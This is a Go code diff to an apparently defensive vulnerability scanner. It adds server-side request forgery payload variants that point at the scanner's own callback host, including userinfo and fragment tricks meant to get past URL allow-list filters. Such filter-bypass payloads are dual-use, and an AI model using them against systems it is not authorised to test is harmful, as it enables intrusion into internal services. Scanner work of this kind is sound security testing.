@@ -1,5 +1,10 @@
 package scanner
 
+import (
+	"net/url"
+	"strings"
+)
+
 // Extended out-of-band (OAST) payload sets — the "wide coverage" additions that
 // connect the remaining blind vulnerability classes to the same token-correlated
 // callback infrastructure the core OAST scanner already uses. Every payload here
@@ -62,29 +67,31 @@ func log4ShellParamPayloads(cb string) []string {
 // direct callback plus the scheme/encoding variants a naive allow-list or
 // "must-start-with-https" filter still lets through. All share one token, so any
 // single callback attributes to this injection point. host is bare host[:port].
-func ssrfOOBPayloads(cb, host string) []string {
+func ssrfOOBPayloads(cb, host, original string) []string {
 	path := ""
-	if i := indexByteFrom(cb, '/', len("http://")); i >= 0 {
-		path = cb[i:]
+	if callback, err := url.Parse(cb); err == nil {
+		path = callback.EscapedPath()
+		if callback.RawQuery != "" {
+			path += "?" + callback.RawQuery
+		}
 	}
-	return []string{
+	out := []string{
 		cb,                       // http://host/oob/<token>
 		"https://" + host + path, // https variant
 		"//" + host + path,       // protocol-relative
 		cb + "#",                 // trailing-fragment filter bypass
 	}
-}
-
-// indexByteFrom is strings.IndexByte starting at offset `from` (returns an
-// absolute index, or -1). Kept local to avoid pulling strings into a payload file.
-func indexByteFrom(s string, b byte, from int) int {
-	if from < 0 {
-		from = 0
+	// Whitelist parser differentials: if discovery captured an originally allowed
+	// URL, keep its host in userinfo/fragment positions while the network client
+	// connects to our callback host. These are the safe, OAST-only variants from
+	// the common allow-list bypass methodology; a callback remains the proof.
+	if u, err := url.Parse(strings.TrimSpace(original)); err == nil && u.Hostname() != "" {
+		allowed := u.Hostname()
+		out = append(out,
+			"http://"+allowed+"@"+host+path,
+			"https://"+allowed+"@"+host+path,
+			cb+"#"+allowed,
+		)
 	}
-	for i := from; i < len(s); i++ {
-		if s[i] == b {
-			return i
-		}
-	}
-	return -1
+	return out
 }
